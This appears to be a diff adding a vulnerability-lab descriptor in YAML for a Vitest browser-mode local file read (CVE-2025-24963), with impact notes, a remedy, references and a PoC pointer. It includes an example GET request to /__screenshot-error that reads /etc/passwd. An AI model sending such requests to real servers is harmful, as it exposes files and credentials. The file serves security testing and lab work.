@@ -1,0 +1,66 @@
+id: vt-2025-24963
+
+info:
+  name: "Vitest Browser Mode API Exposure (LFI & RCE) (CVE-2025-24963)"
+  author: omarkurt
+  description: |
+    Vitest 3.0.0 and earlier vulnerable configurations allow unauthenticated access to the browser API when listening on all interfaces (0.0.0.0).
+    The `__screenshot-error` handler on the browser mode HTTP server responds with any file on the file system (LFI).
+    Attackers can potentially execute arbitrary code or access sensitive system files.
+  targets:
+    - vitest
+  type: CVE
+  cve: CVE-2025-24963
+  cwe: CWE-22
+  cvss:
+    score: 9.8
+    severity: critical
+  affected_versions:
+    - "<= 3.0.0"
+  tags:
+    - lfi
+    - rce
+    - vitest
+    - api-exposure
+
+vulnerabilities:
+  endpoint: /__screenshot-error
+  method: GET
+  param: file
+  request: |
+    GET /__screenshot-error?file=/etc/passwd HTTP/1.1
+    Host: {{target}}
+  response: |
+    HTTP/1.1 200 OK
+    Content-Type: image/png
+
+    root:x:0:0:root:/root:/bin/bash
+    ...
+
+technical: |
+  The `__screenshot-error` handler in `@vitest/browser` (middleware) allows unauthenticated file reading.
+  The server exposes this endpoint when `ui: true` is enabled in `vitest.config.ts`.
+  It does not validate the `file` parameter properly, allowing traversal or direct absolute path access.
+
+impact: |
+  Attackers can read arbitrary files from the server (LFI), including source code, configuration files, and credentials.
+  In some configurations, interaction with the browser runner API may lead to Remote Code Execution (RCE).
+
+remedy: |
+  Upgrade to Vitest version 3.0.4 or later.
+  Restrict Vitest to listen only on localhost (127.0.0.1).
+  Ensure `ui: false` if external access is required for other reasons.
+
+references:
+  - "https://nvd.nist.gov/vuln/detail/CVE-2025-24963"
+  - "https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5"
+  - "https://github.com/projectdiscovery/nuclei-templates-labs/tree/main/http/cves/2025/CVE-2025-24963"
+
+poc:
+  nuclei:
+    - "vt-2025-24963.nuclei.yaml"
+
+providers:
+  docker-compose:
+    path: "docker-compose.yaml"
+    port: 63315
